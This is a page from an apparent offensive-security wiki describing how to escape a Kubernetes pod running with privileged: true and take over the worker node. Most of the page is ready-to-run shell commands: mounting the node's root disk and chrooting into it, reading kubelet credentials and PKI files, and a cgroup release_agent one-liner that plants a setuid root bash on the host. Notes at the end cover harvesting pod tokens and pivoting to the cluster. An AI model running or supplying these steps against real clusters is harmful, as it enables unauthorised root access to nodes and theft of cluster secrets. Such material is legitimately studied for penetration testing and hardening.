---
title: "Privileged pod: node takeover from a privileged security context"
order: 1
description: "A pod whose container runs with securityContext.privileged: true receives the full capability set, all host devices, and unconfined seccomp and AppArmor, exactly like a privileged container. From it an attacker mounts the node root disk or uses the cgroup release_agent to run code on the node as root, taking over the worker."
keywords:
  - privileged pod
  - securitycontext
  - node takeover
  - host disk
  - release_agent
---

# Privileged pod

A pod container with `securityContext.privileged: true` is the Kubernetes equivalent of `docker run --privileged`: it holds the full Linux capability set, can use every host device, and runs with unconfined seccomp and AppArmor. Everything on the runtime-agnostic privileged-container page applies, and the escape is the same, now landing on the Kubernetes worker node.

Confirm the privilege and pick a route:

```bash
grep CapEff /proc/self/status                 # full set (…ffffffff) => privileged
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')
ls /dev | grep -E 'sd|nvme|mem'               # host devices visible
```

## Route: mount the node disk

```bash
fdisk -l 2>/dev/null | grep -E 'Linux|/dev/(sd|nvme|vd)'
mkdir -p /mnt/node && mount /dev/nvme0n1p1 /mnt/node && chroot /mnt/node sh
# node root exposes kubelet creds, static pod manifests, and every pod's secrets
cat /mnt/node/etc/kubernetes/*.conf /mnt/node/var/lib/kubelet/pki/kubelet-client-current.pem 2>/dev/null
```

## Route: cgroup release_agent

Where mounting the disk is awkward, the release_agent one-liner runs a payload on the node as root:

```bash
mkdir /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c && mkdir /tmp/c/x
echo 1 > /tmp/c/x/notify_on_release
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
echo "$host/p" > /tmp/c/release_agent
printf '#!/bin/sh\ncp /bin/bash %s/b; chmod +s %s/b\n' "$host" "$host" > /p && chmod +x /p
sh -c "echo \$\$ > /tmp/c/x/cgroup.procs"
```

The mechanism is identical to [cgroups release_agent](../../../container-escape/privileged-configuration/cgroups-release-agent.md).

## Exploitation notes

- A privileged pod is a node takeover by construction; `cat /proc/self/uid_map` showing `0 0` confirms node root rather than a remapped identity.
- Once on the node, harvest the kubelet credentials and every pod's projected token; see [Kubelet credential theft](kubelet-credential-theft.md), then pivot to the cluster.
- Obtaining a privileged pod in the first place, when you have the RBAC to create pods, is [Pod creation to node](../rbac-privilege-escalation/pod-creation-to-node.md).

## References

- [BishopFox: bad pods (privileged)](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
- [Kubernetes: security context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Trail of Bits: Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
